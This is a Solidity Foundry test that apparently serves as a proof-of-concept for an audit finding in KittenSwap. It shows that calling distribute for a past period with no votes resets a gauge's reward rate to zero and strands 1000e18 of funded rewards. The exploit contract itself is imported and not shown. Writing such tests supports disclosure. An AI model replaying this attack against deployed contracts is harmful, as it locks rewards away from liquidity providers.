// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, Voter, AlgebraGauge, EternalVirtualPool, Kitten, MarkerToken} from "./61952-h-02-reward-rates-can-be-reset-to-0-and-future-rewards-can-b.sol";

// KittenSwap H-02 (finding 61952): Voter._distribute never returns early when a
// gauge has no votes for a valid PAST period, so distribute(pastPeriod, algebraGauge)
// computes emissions==0 and forwards it into AlgebraGauge._notifyRewardAmount(0) ->
// EternalVirtualPool.setRates(0,0), resetting the reward rate to 0 and stranding the
// rewards already funded for the current period.
contract Finding61952Test is Test {
    function test_exploit_pastPeriodDistribution_resetsRewardRate() public {
        Exploit e = new Exploit();

        EternalVirtualPool pool = e.virtualPool();
        MarkerToken marker = e.marker();
        address SINK = 0x000000000000000000000000000000000000D00d;

        // reward rate is 0 before any distribution
        assertEq(pool.rewardRate0(), 0, "rate should start at 0");

        e.run();

        emit log_named_uint("reward rate before attack (per-sec)", e.resetRateFrom());
        emit log_named_uint("reward rate after attack", pool.rewardRate0());
        emit log_named_uint("stranded rewards (locked at rate 0)", e.strandedRewards());

        // the attack reset the previously-positive rate back to 0
        assertGt(e.resetRateFrom(), 0, "legit distribution set a positive rate");
        assertEq(pool.rewardRate0(), 0, "attack reset the reward rate to 0");

        // the 1000e18 funded for the current period is stranded in the pool at rate 0
        assertEq(e.strandedRewards(), 1000 ether, "1000e18 stranded at rate 0");
        assertEq(pool.rewardReserve0(), 1000 ether, "reserve still holds the funded rewards");

        // silent DoS/reward-theft magnitude recorded at the SINK
        assertEq(marker.balanceOf(SINK), 1000 ether, "stranded magnitude recorded at SINK");
    }
}
